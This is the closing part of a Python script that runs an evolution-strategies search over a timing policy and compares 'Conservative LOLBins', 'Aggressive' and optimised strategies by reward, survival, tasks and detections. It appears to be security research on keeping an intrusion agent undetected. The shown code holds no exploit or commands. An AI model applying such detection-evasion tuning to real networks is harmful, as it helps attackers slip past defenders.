        logger.info(f"  gen {gen+1}/{n_gen}  avg={h['avg']:.2f}  max={h['max']:.2f}  "
                    f"eval={avg_eval:.2f}  best={best_fitness:.2f}  "
                    f"surv={eval_result['survival']}  det={eval_result['detected']}  "
                    f"({gen_time:.1f}s)")

    # ── Final evaluation with best ES params ──
    logger.info(f"\n{'='*70}")
    logger.info("FINAL EVALUATION with ES-optimized parameters")
    logger.info(f"{'='*70}")

    best_policy = TimingPolicy(best_params)
    final_results = [run_episode(env, best_policy, verbose=True) for _ in range(3)]
    final_reward = np.mean([r["reward"] for r in final_results])
    final_surv = np.mean([r["survival"] for r in final_results])
    final_tasks = np.mean([r["tasks"] for r in final_results])
    final_det = sum(1 for r in final_results if r["detected"])

    # ── Summary ──
    logger.info(f"\n{'='*70}")
    logger.info("FULL COMPARISON")
    logger.info(f"{'='*70}")
    logger.info(f"{'Strategy':<25} {'Reward':<10} {'Survival':<12} {'Tasks':<8} {'Detected':<12}")
    logger.info("-" * 67)
    logger.info(f"{'Conservative LOLBins':<25} {cons_reward:<10.2f} {cons_surv:<12.0f} {cons_tasks:<8.1f} {cons_det}/3")
    logger.info(f"{'Aggressive':<25} {agg_reward:<10.2f} {agg_surv:<12.0f} {agg_tasks:<8.1f} {agg_det}/3")
    logger.info(f"{'ES-optimized':<25} {final_reward:<10.2f} {final_surv:<12.0f} {final_tasks:<8.1f} {final_det}/3")

    logger.info(f"\n  Best ES parameters:")
    p = best_params
    logger.info(f"    insert_threshold:  {p[0]:.2f} (insert when surprise < {threshold*p[0]:.2f})")
    logger.info(f"    min_wait_steps:    {int(p[1])}")
    logger.info(f"    scan_buffer:       {int(p[2])}")
    logger.info(f"    cooldown:          {int(p[3])}")
    logger.info(f"    phase_alignment:   {p[4]:.2f}")
    logger.info(f"    aggressive_ratio:  {p[5]:.2f}")
    logger.info(f"    choice_bias:       {p[9]:.2f}")

    logger.info(f"\n  ES curve:")
    for h in es_history:
        logger.info(f"    gen {h['gen']:2d}  avg={h['avg']:.2f}  max={h['max']:.2f}  "
                     f"eval={h['eval']:.2f}  best={h['best']:.2f}  "
                     f"surv={h['survival']}  det={h['detected']}")

    env.close()

    torch.save({
        "conservative": cons_results,
        "aggressive": agg_results,
        "es_history": es_history,
        "best_params": best_params.tolist(),
        "final_results": final_results,
    }, "checkpoints/real_env_es.pt")
    logger.info("\n✅ Real environment ES complete. Results saved.")


if __name__ == "__main__":
    main()
